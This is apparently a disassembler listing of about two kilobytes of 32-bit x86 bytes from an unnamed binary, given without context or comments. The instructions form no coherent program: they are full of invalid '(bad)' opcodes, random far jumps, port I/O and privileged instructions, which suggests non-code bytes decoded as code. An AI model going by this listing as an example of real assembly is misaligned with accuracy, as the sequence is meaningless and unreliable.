  418c04:	call   0xf5d4:0xedce023
  418c0b:	jno    0x418c3c
  418c0d:	cs ins BYTE PTR es:[edi],dx
  418c0f:	arpl   WORD PTR [ebp+0x33],ax
  418c12:	aam    0xf1
  418c14:	call   edx
  418c16:	cli    
  418c17:	jmp    FWORD PTR [esi]
  418c19:	mov    DWORD PTR [edx+edx*4-0x79],eax
  418c1d:	xchg   esp,eax
  418c1e:	or     BYTE PTR [ecx+0x765ecdaa],ah
  418c24:	adc    eax,0x4302cbb3
  418c29:	dec    esp
  418c2a:	leave  
  418c2b:	lods   al,BYTE PTR ds:[esi]
  418c2c:	pop    ecx
  418c2d:	jg     0x418bee
  418c2f:	popf   
  418c30:	je     0x418bf0
  418c32:	sar    DWORD PTR [ebp-0xa],0x17
  418c36:	add    eax,esp
  418c38:	aam    0xbd
  418c3a:	xor    DWORD PTR [ebp+0x3e072a36],ecx
  418c40:	jno    0x418be7
  418c42:	addr16 or edi,0x11
  418c46:	dec    ebp
  418c47:	jmp    0x1276:0x3a83cd81
  418c4e:	push   cs
  418c4f:	jle    0x418cad
  418c51:	stos   BYTE PTR es:[edi],al
  418c52:	inc    edi
  418c53:	fisttp WORD PTR [eax+0x25]
  418c56:	mov    ds:0xafb645b7,al
  418c5b:	pusha  
  418c5c:	fwait
  418c5d:	(bad)
  418c60:	xlat   BYTE PTR ds:[ebx]
  418c61:	pop    ss
  418c62:	out    dx,al
  418c63:	adc    al,0x29
  418c65:	test   eax,0x8c3a65e2
  418c6a:	popf   
  418c6b:	push   ebx
  418c6c:	xchg   edx,eax
  418c6d:	lods   eax,DWORD PTR ds:[esi]
  418c6e:	loop   0x418c4b
  418c70:	outs   dx,DWORD PTR ds:[esi]
  418c71:	sbb    al,0x91
  418c73:	sub    eax,0xf4dc10d6
  418c78:	push   edi
  418c79:	fcom   QWORD PTR [esi]
  418c7b:	cs push ds
  418c7d:	or     DWORD PTR [esi+0x16bd1f60],ecx
  418c83:	outs   dx,BYTE PTR ds:[esi]
  418c84:	jle    0x418cb9
  418c86:	int3   
  418c87:	xor    al,0xc7
  418c89:	pushf  
  418c8a:	cmp    BYTE PTR [ecx-0x44],cl
  418c8d:	rol    BYTE PTR [edx-0x4c955e37],1
  418c93:	cld    
  418c94:	dec    edx
  418c95:	jae    0x418cee
  418c97:	mov    edx,0x80976798
  418c9c:	mov    WORD PTR [esi+0xb],?
  418c9f:	loopne 0x418cb0
  418ca1:	(bad)  [ecx]
  418ca3:	xchg   edi,eax
  418ca4:	add    al,0x1b
  418ca6:	aad    0x73
  418ca8:	push   0xffffffe9
  418caa:	pushf  
  418cab:	jns    0x418c35
  418cad:	mov    al,0xe6
  418caf:	xor    eax,0x5579d38
  418cb4:	in     eax,0x1f
  418cb6:	and    ah,bh
  418cb8:	push   esi
  418cb9:	je     0x418c70
  418cbb:	xor    ah,BYTE PTR [ebp-0x4a]
  418cbe:	add    dl,BYTE PTR [esi-0x1b]
  418cc1:	add    ah,ch
  418cc3:	(bad)  
  418cc4:	lea    esi,[ecx+0x4]
  418cc7:	jg     0x418c69
  418cc9:	sub    BYTE PTR [edi],ch
  418ccb:	xor    BYTE PTR [edx],0xaf
  418cce:	in     eax,0x30
  418cd0:	add    DWORD PTR [edi+0x458f9a51],ecx
  418cd6:	icebp  
  418cd7:	repz push cs
  418cd9:	jo     0x418c91
  418cdb:	mov    ds:0x186a77cf,al
  418ce0:	xchg   edi,eax
  418ce1:	ins    BYTE PTR es:[edi],dx
  418ce2:	shr    BYTE PTR [ebx],0x50
  418ce5:	pop    edx
  418ce6:	(bad)  
  418ce7:	mov    eax,0xb757c726
  418cec:	ja     0x418d52
  418cee:	shr    BYTE PTR ds:0x2883f78b,0x9f
  418cf5:	xlat   BYTE PTR ds:[ebx]
  418cf6:	pop    edi
  418cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cf8:	inc    eax
  418cf9:	(bad)  
  418cfa:	xor    al,0x59
  418cfc:	xchg   ebx,eax
  418cfd:	dec    esi
  418cfe:	sbb    ecx,DWORD PTR [eax-0x7]
  418d01:	fiadd  DWORD PTR [ebx]
  418d03:	out    dx,al
  418d04:	nop
  418d05:	sub    dh,dl
  418d07:	jle    0x418d7a
  418d09:	xchg   ebp,eax
  418d0a:	ret    
  418d0b:	icebp  
  418d0c:	inc    ebx
  418d0d:	shl    BYTE PTR [edi],cl
  418d0f:	out    0x79,al
  418d11:	push   ebp
  418d12:	mov    ds:0x40ec97bd,al
  418d17:	rcl    DWORD PTR [edx+0x67925521],0x36
  418d1e:	imul   esi,esp,0xc3af8f27
  418d24:	push   cs
  418d25:	lock inc edx
  418d27:	inc    eax
  418d28:	xor    DWORD PTR [esi],0x75f78173
  418d2e:	sahf   
  418d2f:	arpl   WORD PTR [ecx+0x65e63625],bx
  418d35:	inc    esi
  418d36:	retf   
  418d37:	sub    al,0x43
  418d39:	mov    ecx,0x83f0819e
  418d3e:	ins    BYTE PTR es:[edi],dx
  418d3f:	mov    edx,0xa1efca0a
  418d44:	add    DWORD PTR [edi-0x40084058],edx
  418d4a:	push   DWORD PTR [ebx+0x57b3c598]
  418d50:	popa   
  418d51:	lock arpl WORD PTR [edx+0x43c0245d],si
  418d58:	les    ecx,FWORD PTR [esi]
  418d5a:	mov    ebp,0xaf534561
  418d5f:	pop    ss
  418d60:	sbb    DWORD PTR [esi],edx
  418d62:	into   
  418d63:	adc    al,0xa9
  418d65:	pop    edx
  418d66:	in     al,0x1
  418d68:	xor    al,0x15
  418d6a:	mov    eax,ds:0x41bd5fa7
  418d6f:	retf   0xfd2e
  418d72:	cmc    
  418d73:	outs   dx,DWORD PTR ds:[esi]
  418d74:	mov    esp,0x892f52ad
  418d79:	test   BYTE PTR [eax],al
  418d7b:	mov    edx,0xfd1f254d
  418d80:	jae    0x418dc6
  418d82:	mov    eax,ds:0xe80af060
  418d87:	dec    ecx
  418d88:	into   
  418d89:	xor    eax,0x7ef95284
  418d8e:	sbb    al,0xeb
  418d90:	pop    edx
  418d91:	out    dx,al
  418d92:	(bad)  
  418d93:	fwait
  418d94:	pop    ecx
  418d95:	ins    BYTE PTR es:[edi],dx
  418d96:	and    eax,0xc65820aa
  418d9b:	int3   
  418d9c:	cld    
  418d9d:	mov    ebx,DWORD PTR [esi-0x944a60f]
  418da3:	jge    0x418d9a
  418da5:	mov    bl,0xf7
  418da7:	fist   WORD PTR [edi+edx*4-0x36]
  418dab:	sar    BYTE PTR [esi+eax*1],1
  418dae:	pop    ecx
  418daf:	mov    ch,0x1b
  418db1:	sub    al,BYTE PTR [ecx-0x7]
  418db4:	xchg   edi,eax
  418db5:	hlt    
  418db6:	mov    ss:0x292f40f6,al
  418dbc:	in     al,0x7d
  418dbe:	popa   
  418dbf:	test   al,0x91
  418dc1:	mov    bh,0xcc
  418dc3:	inc    ebp
  418dc4:	jecxz  0x418d61
  418dc6:	cmp    eax,0x659eef7e
  418dcb:	push   esi
  418dcc:	and    bh,al
  418dce:	hlt    
  418dcf:	sbb    eax,0xea6dc2cc
  418dd4:	jns    0x418ddd
  418dd6:	dec    ecx
  418dd7:	cmp    BYTE PTR [eax-0x402119c],ah
  418ddd:	(bad)  
  418dde:	pop    ebx
  418ddf:	in     al,0xb3
  418de1:	mov    DWORD PTR [ecx-0x5640b642],esp
  418de7:	imul   BYTE PTR [ebp-0x31ee8efc]
  418ded:	test   DWORD PTR [edx-0x285d3841],0xc0edf24a
  418df7:	ss inc ax
  418dfa:	dec    esp
  418dfb:	scas   al,BYTE PTR es:[edi]
  418dfc:	ins    DWORD PTR es:[edi],dx
  418dfd:	cmp    eax,edx
  418dff:	push   ss
  418e00:	sbb    ch,dh
  418e02:	mov    bl,0xd
  418e04:	sub    eax,0x713f349e
  418e09:	inc    edx
  418e0a:	inc    ecx
  418e0b:	mov    eax,0x8be0477f
  418e10:	push   esi
  418e11:	arpl   WORD PTR [esi+eiz*8+0x43],di
  418e15:	sub    cl,ah
  418e17:	adc    eax,0x859dac78
  418e1c:	jg     0x418e7b
  418e1e:	ja     0x418dea
  418e20:	jns    0x418da8
  418e22:	out    dx,eax
  418e23:	shr    DWORD PTR [eax-0x73333a33],0xed
  418e2a:	or     esi,esp
  418e2c:	push   eax
  418e2d:	test   BYTE PTR [esi-0x30],bl
  418e30:	push   DWORD PTR [esi+0x3caa81fb]
  418e36:	inc    edi
  418e37:	repnz push edi
  418e39:	inc    esp
  418e3a:	or     eax,0x887a4400
  418e3f:	cdq    
  418e40:	xchg   esi,eax
  418e41:	sbb    al,0x25
  418e43:	dec    esi
  418e44:	mov    esi,0xb0bd668d
  418e49:	into   
  418e4a:	(bad)  
  418e4b:	xchg   esi,eax
  418e4c:	jno    0x418e53
  418e4e:	sbb    DWORD PTR gs:[esi-0x4f],ebp
  418e52:	and    BYTE PTR [edx+eax*1],bl
  418e55:	(bad)  
  418e56:	popa   
  418e57:	cmp    al,0x2d
  418e59:	sub    esp,edi
  418e5b:	retf   0x20d7
  418e5e:	pop    ebp
  418e5f:	mov    DWORD PTR [eax+0x4e6da18f],ebx
  418e65:	and    ah,bl
  418e67:	les    esi,FWORD PTR [ecx]
  418e69:	cmc    
  418e6a:	and    al,0xe9
  418e6c:	mov    ebx,0x14a1410
  418e71:	mov    ds:0xd0de1feb,al
  418e76:	push   0xcadddf77
  418e7b:	rcl    BYTE PTR [ecx+ebp*4-0x45105328],1
  418e82:	inc    esp
  418e83:	adc    eax,0xbf03be12
  418e88:	clc    
  418e89:	in     eax,dx
  418e8a:	mov    eax,0xa0e2e674
  418e8f:	imul   edi,DWORD PTR [ebx+0xc648886],0xffffff93
  418e96:	push   ecx
  418e97:	xchg   ebp,eax
  418e98:	xor    BYTE PTR [eax],bl
  418e9a:	pop    esi
  418e9b:	ins    BYTE PTR es:[edi],dx
  418e9c:	jle    0x418e80
  418e9e:	jmp    0xc5e3cf4f
  418ea3:	jmp    0x807c:0xb60ec46f
  418eaa:	in     al,0x7a
  418eac:	jnp    0x418e57
  418eae:	mov    ebx,0x8b0c306a
  418eb3:	(bad)  
  418eb4:	mov    ebp,0x5d287c1c
  418eb9:	je     0x418eef
  418ebb:	fimul  DWORD PTR [ecx+ebp*4]
  418ebe:	mov    esi,0x9fb049e1
  418ec3:	add    edi,0x39
  418ec6:	cwde   
  418ec7:	mov    al,0xee
  418ec9:	nop
  418eca:	xor    DWORD PTR ds:0xadb1458,ecx
  418ed0:	mov    DWORD PTR [edx],edx
  418ed2:	mov    cl,0x5a
  418ed4:	pop    edx
  418ed5:	mov    ah,0xe1
  418ed7:	mov    cl,bh
  418ed9:	dec    esi
  418eda:	and    BYTE PTR [ebx+eiz*2],ch
  418edd:	ins    BYTE PTR es:[edi],dx
  418ede:	ds cli 
  418ee0:	jne    0x418eec
  418ee2:	cmp    esp,ecx
  418ee4:	mov    ecx,0x3d9509d4
  418ee9:	jnp    0x418ef9
  418eeb:	push   0x50c624db
  418ef0:	loop   0x418f38
  418ef2:	jmp    0xffe2df60
  418ef7:	add    BYTE PTR [edi+0x41305d15],al
  418efd:	test   BYTE PTR [ecx],dl
  418eff:	inc    esp
  418f00:	mov    esi,0xc2f32b95
  418f05:	xchg   ebx,eax
  418f06:	add    eax,0xc9f7787
  418f0b:	xchg   ecx,eax
  418f0c:	xor    DWORD PTR [eax+0x59],edi
  418f0f:	cli    
  418f10:	and    DWORD PTR [edx+esi*8],edi
  418f13:	int    0xcc
  418f15:	mov    edx,0xfe6a267b
  418f1a:	out    dx,al
  418f1b:	mov    WORD PTR [ebx+eiz*1-0x27],gs
  418f1f:	data16 cmp al,0x1a
  418f22:	inc    eax
  418f23:	or     bl,BYTE PTR [ecx-0x5b47c02b]
  418f29:	cmp    bl,BYTE PTR [esi]
  418f2b:	mov    ds:0xe40512ef,al
  418f30:	je     0x418ef2
  418f32:	and    al,0x5e
  418f34:	sbb    DWORD PTR [edx-0x7d7ed8cb],eax
  418f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f3b:	lods   eax,DWORD PTR ds:[esi]
  418f3c:	lahf   
  418f3d:	push   ebx
  418f3e:	outs   dx,DWORD PTR ds:[esi]
  418f3f:	jge    0x418f61
  418f41:	adc    eax,0x3070c13a
  418f46:	jns    0x418f5f
  418f48:	push   ecx
  418f49:	ret    
  418f4a:	cdq    
  418f4b:	mov    dh,0x7
  418f4d:	pop    ecx
  418f4e:	outs   dx,DWORD PTR ds:[esi]
  418f4f:	cwde   
  418f50:	xor    edi,DWORD PTR cs:[ebx]
  418f53:	subps  xmm6,XMMWORD PTR [edi]
  418f56:	call   0xea27:0x7e1d7659
  418f5d:	mov    ah,0x92
  418f5f:	push   ecx
  418f60:	and    DWORD PTR [eax+0x68073434],ebp
  418f66:	push   ecx
  418f67:	push   0xf3d58fb6
  418f6c:	popa   
  418f6d:	(bad)  
  418f6e:	push   DWORD PTR [ebx]
  418f70:	add    al,0x40
  418f72:	data16 clc 
  418f74:	add    dh,BYTE PTR [eax]
  418f76:	sbb    eax,DWORD PTR gs:[esi+0x30]
  418f7a:	arpl   WORD PTR [esi-0x34],di
  418f7d:	test   al,0xb7
  418f7f:	jns    0x418f7b
  418f81:	push   esp
  418f82:	or     eax,0x14df696c
  418f87:	sbb    dl,BYTE PTR [eax-0x623ea116]
  418f8d:	std    
  418f8e:	sbb    eax,0x1b4bc259
  418f93:	jne    0x418ffe
  418f95:	imul   ebp,DWORD PTR [eax-0x31],0xffffffce
  418f99:	adc    BYTE PTR [esi],ah
  418f9b:	std    
  418f9c:	bound  ecx,QWORD PTR [eax+esi*4+0x21]
  418fa0:	jo     0x418f55
  418fa2:	sub    eax,0xb92abaaa
  418fa7:	clc    
  418fa8:	shl    BYTE PTR [ecx+edi*1],cl
  418fab:	push   ebx
  418fac:	push   esi
  418fad:	mov    WORD PTR [edi-0x56],fs
  418fb0:	iret   
  418fb1:	rcl    DWORD PTR [ecx+0x36fe7e90],cl
  418fb7:	or     eax,DWORD PTR [ebx]
  418fb9:	jae    0x418f7c
  418fbb:	pop    edi
  418fbc:	and    BYTE PTR [esi+0xa],0xfe
  418fc0:	nop
  418fc1:	inc    ebx
  418fc2:	xchg   DWORD PTR [ebx+ebp*4],esp
  418fc5:	xor    eax,0x6169314
  418fca:	nop
  418fcb:	out    dx,eax
  418fcc:	test   al,0x57
  418fce:	mov    dh,0x5a
  418fd0:	leave  
  418fd1:	stc    
  418fd2:	pop    ebx
  418fd3:	inc    eax
  418fd4:	mov    al,0xae
  418fd6:	pop    esi
  418fd7:	xchg   esp,eax
  418fd8:	stc    
  418fd9:	in     al,dx
  418fda:	jl     0x41901b
  418fdc:	into   
  418fdd:	pop    ss
  418fde:	or     eax,0x2b3e0d94
  418fe3:	cmp    dh,BYTE PTR ss:[esi+edx*1-0x1d34965b]
  418feb:	inc    edi
  418fec:	loope  0x419050
  418fee:	pushf  
  418fef:	jmp    0xf7aa:0xbc53acd9
  418ff6:	mov    ch,0x82
  418ff8:	cdq    
  418ff9:	mov    esi,edx
  418ffb:	jae    0x418feb
  418ffd:	jnp    0x41902f
  418fff:	dec    ebp
  419000:	mov    cl,0x0
  419002:	pop    ss
  419003:	punpcklwd mm0,DWORD PTR [eax+0x23]
  419007:	(bad)  
  419008:	adc    DWORD PTR [ecx-0x46],edi
  41900b:	mov    edx,0x826ae42d
  419010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419011:	pop    ss
  419012:	and    eax,0x7ded650
  419017:	clc    
  419018:	xchg   edi,eax
  419019:	mov    al,0xc1
  41901b:	jno    0x41900a
  41901d:	adc    BYTE PTR [eax],0xb9
  419020:	xchg   esp,eax
  419021:	repnz das 
  419023:	adc    dl,BYTE PTR [esi]
  419025:	xchg   ecx,eax
  419026:	mov    BYTE PTR [ecx-0x4e9cf6ed],dl
  41902c:	add    eax,0x73062bba
  419031:	mov    ecx,0x2c8c46db
  419036:	and    edi,ebx
  419038:	sub    al,0xbd
  41903a:	pop    ebx
  41903c:	out    dx,al
  41903d:	or     al,0x67
  41903f:	fcom   QWORD PTR [ebx-0x7a]
  419042:	xchg   DWORD PTR [eax*4-0x67df9125],esp
  419049:	popf   
  41904a:	sti    
  41904b:	nop
  41904c:	push   ebx
  41904d:	lea    ecx,[eax+0x45]
  419050:	and    eax,0x86d3824a
  419055:	push   eax
  419056:	and    DWORD PTR [esi+eiz*8],eax
  419059:	mov    edx,0x6a117452
  41905e:	cmpxchg DWORD PTR [ebx-0x23],ebp
  419062:	pop    ecx
  419063:	jb     0x4190de
  419065:	mov    bh,0xc1
  419067:	mov    al,0x20
  419069:	in     al,0x70
  41906b:	mov    ebp,0xe2bb00dd
  419070:	mov    eax,0x27d93ede
  419075:	ins    BYTE PTR es:[edi],dx
  419076:	in     al,0xcc
  419078:	call   0xbdbd:0x4814a7dd
  41907f:	sub    eax,0x54dad054
  419084:	rcl    BYTE PTR [ebp-0x7d],0x39
  419088:	nop
  419089:	adc    eax,esi
  41908b:	imul   esp,DWORD PTR ds:0x76cbe483,0xffffffcf
  419092:	and    ah,bh
  419094:	adc    ah,cl
  419096:	dec    ecx
  419097:	xchg   ch,al
  419099:	and    ch,BYTE PTR [edx+0x6a81d232]
  41909f:	xchg   esi,eax
  4190a0:	aad    0x2c
  4190a2:	clc    
  4190a3:	jmp    0x41908a
  4190a5:	int3   
  4190a6:	mov    esi,0xd581178d
  4190ab:	cmp    esi,DWORD PTR [ecx+ebp*2+0x24]
  4190af:	loopne 0x419032
  4190b1:	out    dx,al
  4190b2:	push   esp
  4190b3:	stc    
  4190b4:	dec    esp
  4190b5:	inc    eax
  4190b6:	xchg   esp,edx
  4190b8:	test   DWORD PTR [eax],esp
  4190ba:	lahf   
  4190bb:	inc    ecx
  4190bc:	mov    ds:0xf80f89b9,al
  4190c1:	fcmove st,st(4)
  4190c3:	outs   dx,DWORD PTR ds:[esi]
  4190c4:	fwait
  4190c5:	setl   BYTE PTR [ebp-0x7d]
  4190c9:	jae    0x41912f
  4190cb:	(bad)  
  4190cc:	fidivr DWORD PTR [ebp-0xa]
  4190cf:	or     ch,ch
  4190d1:	inc    eax
  4190d2:	mov    bh,dl
  4190d4:	pop    ebx
  4190d5:	(bad)  
  4190d6:	in     al,0x2d
  4190d8:	cmp    bl,BYTE PTR [edx]
  4190da:	loopne 0x41906d
  4190dc:	inc    eax
  4190dd:	popa   
  4190de:	push   ebp
  4190df:	sub    BYTE PTR [edi-0x39d7834],ch
  4190e5:	pop    es
  4190e6:	sub    dl,BYTE PTR [eax]
  4190e8:	mov    edx,0xee7fd208
  4190ed:	call   0xe957:0xb3acf943
  4190f4:	jno    0x419091
  4190f6:	sbb    DWORD PTR [eax+edx*1],edi
  4190f9:	je     0x4190fd
  4190fb:	push   esi
  4190fc:	pop    edi
  4190fd:	inc    esi
  4190fe:	jmp    0x4190db
  419100:	cs xchg esp,eax
  419102:	call   0x24da:0x3bc858f0
  419109:	inc    esi
  41910a:	push   eax
  41910b:	push   ebp
  41910c:	lods   al,BYTE PTR ds:[esi]
  41910d:	push   esp
  41910e:	aad    0x94
  419110:	fs inc ebp
  419112:	ficom  DWORD PTR [ebx]
  419114:	xchg   esp,eax
  419115:	or     BYTE PTR [edi],dh
  419117:	in     al,dx
  419118:	or     al,0xcf
  41911a:	hlt    
  41911b:	dec    ebp
  41911c:	call   0x793f:0x7237257e
  419123:	adc    ebp,DWORD PTR [edi]
  419125:	pop    ebx
  419126:	inc    edx
  419127:	seto   BYTE PTR [ecx+0x51c30135]
  41912e:	int    0x89
  419130:	shl    DWORD PTR [edx-0x28],cl
  419133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419134:	daa    
  419135:	inc    ecx
  419136:	add    DWORD PTR [eax-0x4a5e95be],esi
  41913c:	mov    cl,cl
  41913e:	adc    eax,0x5bd504c4
  419143:	inc    eax
  419144:	addr16 mov ds:0xd61c,eax
  419148:	inc    ecx
  419149:	adc    dh,0x91
  41914c:	xchg   ebp,eax
  41914d:	cmp    bl,bl
  41914f:	jbe    0x41915e
  419151:	aad    0xeb
  419153:	test   eax,0xf39a7767
  419158:	mov    ds:0x817dc983,eax
  41915d:	and    edi,DWORD PTR [esi+0x70]
  419160:	retf   0x3986
  419163:	or     dl,al
  419165:	out    0xbd,al
  419167:	in     al,dx
  419168:	gs jmp 0x8174:0xe26d821a
  419170:	inc    esp
  419171:	popa   
  419172:	iret   
  419173:	pop    ebp
  419174:	adc    eax,0x3f39c8f8
  419179:	pop    ebp
  41917a:	test   al,0x4d
  41917c:	xor    al,0x4e
  41917e:	ja     0x4191dc
  419180:	loope  0x419160
  419182:	je     0x4191d2
  419184:	mov    dh,0x2c
  419186:	push   ecx
  419187:	cmp    esi,esi
  419189:	push   es
  41918a:	adc    eax,0x50046511
  41918f:	jl     0x4191c7
  419191:	jne    0x41920e
  419193:	pushf  
  419194:	and    BYTE PTR [esi+0x5a8a370e],bl
  41919a:	pop    ebx
  41919b:	cmp    al,0xaa
  41919d:	stc    
  41919e:	inc    edi
  41919f:	cmc    
  4191a0:	dec    ebx
  4191a1:	lds    ebp,FWORD PTR [ebp+0x41a5e125]
  4191a7:	aam    0x8e
  4191a9:	rcr    DWORD PTR [esi+ebp*2+0x76],0x92
  4191ae:	(bad)  
  4191af:	sahf   
  4191b0:	aad    0xee
  4191b2:	cdq    
  4191b3:	mov    eax,0x773317b6
  4191b8:	mov    ds:0x4c1bd435,eax
  4191bd:	sbb    BYTE PTR [edx-0x5c56572b],bh
  4191c3:	xor    edi,0x1e7b0b6c
  4191c9:	xchg   esp,eax
  4191ca:	lock loope 0x41918a
  4191cd:	out    0x10,al
  4191cf:	outs   dx,BYTE PTR ds:[esi]
  4191d0:	jae    0x419238
  4191d2:	push   edx
  4191d3:	jb     0x4191c1
  4191d5:	push   ss
  4191d6:	mov    eax,ds:0x262360cb
  4191db:	pusha  
  4191dc:	sbb    DWORD PTR [esi-0x46d42c5b],0xffffffa8
  4191e3:	jnp    0x419263
  4191e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191e6:	or     BYTE PTR fs:0x94cb3db2,0xc2
  4191ee:	mov    eax,ds:0x5d628709
  4191f3:	xor    eax,0xae461009
  4191f8:	mov    ch,0x72
  4191fa:	(bad)  
  4191fc:	lahf   
  4191fd:	pusha  
  4191fe:	retf   0xc3c5
  419201:	sub    DWORD PTR [esp+edx*1-0x3a603ccc],eax
  419208:	pop    eax
  419209:	mov    eax,0xd10cacb8
  41920e:	stos   BYTE PTR es:[edi],al
  41920f:	xor    eax,0xfc16a176
  419214:	add    al,BYTE PTR [esi+edi*8]
  419217:	cmp    DWORD PTR [ebx-0xf],0x38de0cfc
  41921e:	(bad)  
  41921f:	adc    DWORD PTR ds:0x8513a54b,eax
  419225:	scas   eax,DWORD PTR es:[edi]
  419226:	inc    esp
  419227:	jns    0x41929e
  419229:	sbb    dl,BYTE PTR [ebp+0x5f0336e7]
  41922f:	pusha  
  419230:	dec    eax
  419231:	or     eax,0xd1152a90
  419236:	aam    0xca
  419238:	aas    
  419239:	mov    bl,0xf8
  41923b:	mul    BYTE PTR [ebp+edi*2+0x6d707ca0]
  419242:	test   ah,dl
  419244:	and    al,0x94
  419246:	xor    esi,DWORD PTR [ecx-0x62]
  419249:	xchg   ebp,eax
  41924a:	outs   dx,BYTE PTR ds:[esi]
  41924b:	sbb    ecx,DWORD PTR [ebp+0x60]
  41924e:	push   es
  41924f:	popa   
  419250:	mov    ch,0x2e
  419252:	call   0xcfb9:0xf5d0094b
  419259:	pop    esi
  41925a:	jl     0x41924a
  41925c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41925d:	mov    dh,0x88
  41925f:	dec    edx
  419260:	adc    al,BYTE PTR [eax]
  419262:	stos   BYTE PTR es:[edi],al
  419263:	pop    edi
  419264:	and    al,0x60
  419266:	into   
  419267:	(bad)  [esi+esi*1-0x72]
  41926b:	pop    edx
  41926c:	sbb    eax,0x477d06e4
  419271:	jno    0x4192e2
  419273:	or     al,0x1b
  419275:	dec    edi
  419276:	(bad)  
  419277:	rol    BYTE PTR [esi+0x2d512acc],0x8f
  41927e:	in     al,0xea
  419280:	(bad)  
  419282:	or     eax,0x5d8b123d
  419287:	dec    ebp
  419288:	cmp    ch,ch
  41928a:	xchg   edx,eax
  41928b:	jns    0x41927b
  41928d:	aas    
  41928e:	in     al,0xac
  419290:	pop    eax
  419291:	and    al,0x52
  419293:	pop    edi
  419294:	xlat   BYTE PTR ds:[ebx]
  419295:	ret    
  419296:	cmp    al,0x5
  419298:	adc    DWORD PTR [esp+ebp*1-0x5c4817c4],0x70f1e9e4
  4192a3:	or     eax,0x90efd30e
  4192a8:	or     eax,0xf51cc20a
  4192ad:	and    esp,edx
  4192af:	pusha  
  4192b0:	ds jnp 0x4192a7
  4192b3:	dec    edi
  4192b4:	hlt    
  4192b5:	or     DWORD PTR [edi-0x1d41a317],ebx
  4192bb:	push   ebx
  4192bc:	(bad)  
  4192bd:	in     al,0xea
  4192bf:	daa    
  4192c0:	and    al,0xf6
  4192c2:	lods   al,BYTE PTR ds:[esi]
  4192c3:	into   
  4192c4:	sub    al,0xee
  4192c6:	xlat   BYTE PTR ds:[ebx]
  4192c7:	stos   BYTE PTR es:[edi],al
  4192c8:	xor    al,0x6d
  4192ca:	dec    ebx
  4192cb:	int    0x42
  4192cd:	loop   0x4192e6
  4192cf:	imul   esi,DWORD PTR [edi-0x748e81d9],0x2644eb14
  4192d9:	mov    esp,0x68193059
  4192de:	mov    dh,0xdb
  4192e0:	rcr    bl,1
  4192e2:	and    DWORD PTR [esp+edx*2+0x51],edx
  4192e6:	adc    DWORD PTR [eax+0x383e8ebe],edi
  4192ec:	xlat   BYTE PTR ds:[ebx]
  4192ed:	sti    
  4192ee:	mov    cs,WORD PTR [edi]
  4192f0:	inc    esi
  4192f1:	outs   dx,BYTE PTR ds:[esi]
  4192f2:	sbb    dh,bh
  4192f4:	xor    cl,bl
  4192f6:	leave  
  4192f7:	or     DWORD PTR [ebx-0x5d],edi
  4192fa:	mov    cl,0xaf
  4192fc:	pop    es
  4192fd:	cmp    eax,DWORD PTR [edx]
  4192ff:	fbstp  TBYTE PTR [esi+0x3f00e6aa]
  419305:	jo     0x4192a8
  419307:	xchg   DWORD PTR [edx+esi*1+0x7d],eax
  41930b:	push   es
  41930c:	aas    
  41930d:	pop    es
  41930e:	mov    al,ds:0x8f90ed7
  419313:	add    eax,0xc1e6b6f6
  419318:	out    dx,eax
  419319:	push   ss
  41931a:	jnp    0x4192df
  41931c:	dec    eax
  41931d:	rcl    BYTE PTR [ebx+0x3f],cl
  419320:	data16 gs sahf 
  419323:	xchg   edx,eax
  419324:	stc    
  419325:	fwait
  419326:	xchg   esp,eax
  419327:	lock icebp 
  419329:	mov    dh,0x24
  41932b:	imul   ecx,DWORD PTR [ebx+ebx*4-0x5],0x9913b521
  419333:	cdq    
  419334:	xchg   ebx,eax
  419335:	mov    eax,ds:0x239d8a4f
  41933a:	ja     0x4193a7
  41933c:	imul   esp,DWORD PTR [esi-0x30],0xffffff97
  419340:	imul   edx,ecx,0xffffffcf
  419343:	stos   DWORD PTR es:[edi],eax
  419344:	push   DWORD PTR ds:0x82171453
  41934b:	nop
  41934c:	(bad)  
  41934d:	cmp    BYTE PTR [eax-0x7a],cl
  419350:	and    eax,esp
  419352:	call   0x828:0xb17e0507
  419359:	das    
  41935a:	or     BYTE PTR [edi-0x122c24ed],0xe6
  419361:	mov    al,0x8e
  419363:	adc    eax,0x7562e938
  419368:	ins    BYTE PTR es:[edi],dx
  419369:	adc    bh,BYTE PTR [eax]
  41936b:	and    BYTE PTR [edx+0x69334034],0xa3
  419372:	hlt    
  419373:	push   ds
  419374:	mov    edx,0xac61c866
  419379:	scas   eax,DWORD PTR es:[edi]
  41937a:	iret   
  41937b:	add    eax,0x2f3a76a6
  419380:	and    al,0x38
  419382:	repz ds xchg edx,eax
  419385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419386:	xchg   ebp,eax
  419387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419388:	dec    ebp
  41938a:	pop    esp
  41938b:	ins    BYTE PTR es:[edi],dx
  41938c:	int3   
  41938d:	mov    ebp,DWORD PTR [ebx+0x3ccb1036]
  419393:	dec    ebp
  419394:	je     0x4193c5
  419396:	pop    es
  419397:	out    dx,al
  419398:	(bad)  
  419399:	mov    ch,0xc
  41939b:	mov    bl,0x40
  41939d:	pop    eax
  41939e:	fs pop edx
  4193a0:	adc    BYTE PTR [esi-0x58c7087],bl
  4193a6:	loopne 0x419366
  4193a8:	inc    edx
  4193a9:	sub    bl,BYTE PTR [edi+0x5df7d551]
  4193af:	das    
  4193b0:	jmp    0x419411
  4193b2:	loopne 0x4193da
  4193b4:	and    DWORD PTR [ebp-0x56],ebp
  4193b7:	sub    BYTE PTR [edi+0x44a10445],bl
  4193bd:	and    eax,ebx
  4193bf:	or     dh,dl
  4193c1:	adc    eax,0xae425952
  4193c6:	or     BYTE PTR [ecx+0x30],ch
  4193c9:	sub    eax,0x6d2c2fe8
  4193ce:	ror    ch,1
  4193d0:	add    eax,0xb777cce0
  4193d5:	add    ecx,DWORD PTR [edx+0x52]
  4193d8:	leave  
  4193d9:	les    edi,FWORD PTR [ebx+0x4f]
  4193dc:	mov    eax,ds:0x3882166d
  4193e1:	push   0xf
  4193e3:	das    
  4193e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193e5:	add    BYTE PTR [esi+0xb],cl
  4193e8:	sub    ch,BYTE PTR [ebp-0x5990346f]
  4193ee:	scas   al,BYTE PTR es:[edi]
  4193ef:	or     DWORD PTR [edx],0x67
